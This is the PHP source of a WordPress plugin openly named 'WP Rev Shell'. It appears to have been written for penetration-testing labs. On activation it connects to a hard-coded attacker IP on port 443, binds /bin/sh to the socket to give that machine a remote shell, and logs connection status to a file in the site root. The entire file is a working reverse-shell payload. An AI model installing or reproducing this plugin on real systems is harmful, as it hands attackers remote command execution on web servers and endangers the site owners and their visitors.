/*
Plugin Name: WP Rev Shell with Error Logging
Description: Reverse Shell with Timestamp Logging(site/log.txt contains shell status and errors)
Version: 0.1
Author: Sanjin Dedic
*/

function activate_reverse_shell() {
    // IP address of the attacker's machine where the reverse shell should connect.
    $ip = '192.168.45.198'; 

    // The port on the attacker's machine to which the reverse shell will connect.
    $port = 443; 

    // Path to the log file, located in the WordPress root directory.
    $log_file = ABSPATH . 'log.txt'; 

    // Check if the log file exists, if not, create it and add a header.
    if (!file_exists($log_file)) {
        file_put_contents($log_file, "Reverse Shell Connection Log\n\n", FILE_APPEND);
    }

    try {
        // Attempt to open a socket connection to the specified IP and port.
        $sock = @fsockopen($ip, $port);

        // If the socket connection fails, throw an exception.
        if (!$sock) {
            throw new Exception("Could not connect to $ip on port $port");
        }

        // Attempt to open a process (/bin/sh) with the socket as STDIN, STDOUT, STDERR.
        $proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);

        // If the process creation fails, throw an exception.
        if (!$proc) {
            throw new Exception("Failed to open a shell");
        }

        // Get the current timestamp.
        $timestamp = date('Y-m-d H:i:s');
        // Message indicating a successful connection.
        $success_message = "Reverse shell activated successfully. Probable connection at timestamp: $timestamp\n";
        // Append the success message to the log file.
        file_put_contents($log_file, $success_message, FILE_APPEND);
        // Output the success message to STDOUT.
        fwrite(STDOUT, $success_message);
    } catch (Exception $e) {
        // If an exception is caught, log the error message to the log file and output it to STDOUT.
        file_put_contents($log_file, $e->getMessage() . "\n", FILE_APPEND);
        fwrite(STDOUT, "Error: " . $e->getMessage() . "\nCheck the root directory for the log file.\n");
    }
}

// Register the function to be executed upon plugin activation.
register_activation_hook(__FILE__, 'activate_reverse_shell');
?>
